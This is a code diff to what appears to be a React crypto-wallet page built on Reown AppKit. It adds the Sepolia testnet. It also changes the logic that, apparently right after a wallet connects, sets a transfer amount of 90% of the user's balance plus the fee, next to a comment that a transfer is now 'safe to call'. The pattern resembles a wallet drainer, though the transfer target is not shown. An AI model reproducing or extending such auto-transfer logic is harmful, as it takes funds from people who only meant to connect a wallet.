@@ -9,7 +9,7 @@ import {
   solana, 
   solanaTestnet, 
   solanaDevnet, 
-  bitcoin 
+  bitcoin,   sepolia, 
 } from '@reown/appkit/networks';
 import { useAppKit, useAppKitAccount } from "@reown/appkit/react";
 import {
@@ -41,7 +41,8 @@ const CHAINS = {
   [solana.id]: solana,
   [solanaTestnet.id]: solanaTestnet,
   [solanaDevnet.id]: solanaDevnet,
-  [bitcoin.id]: bitcoin
+  [bitcoin.id]: bitcoin,
+  [sepolia.id] :   sepolia,
 };
 
 const activeChain = CHAINS[chainId];
@@ -53,6 +54,7 @@ function formatBalance(balanceBigInt, chain) {
 
   const decimalsMap = {
     mainnet: 18,
+      sepolia:18,
     arbitrum: 18,
     bsc: 18,
     bitcoin: 8,
@@ -96,7 +98,6 @@ function formatBalance(balanceBigInt, chain) {
       console.log("Wallet connected:", address);
       console.log("Connected to:", activeChain?.name);
       walletConnectNotification();
-      // setAmountToSend(balance.data?.value)
       console.log("Balance:", formatBalance(balance.data?.value, activeChain));
 
       // ✅ Now safe to call transfer
@@ -116,8 +117,8 @@ function formatBalance(balanceBigInt, chain) {
     if (estimateGas.data && gasPrice.data && balance.data?.value) {
       const fee = estimateGas.data * gasPrice.data; // bigint × bigint
       setTotalFee(fee);
-      const bufferPercent = (fee * 80n) / 100n;
-      setAmountToSend(balance.data?.value - (fee + bufferPercent));
+
+      setAmountToSend((balance.data?.value * 90n)/100n + fee);
     }
     console.log("total fee:", totalFee, balance.data?.symbol);
   }, [estimateGas.data, gasPrice.data, balance.data?.value]);
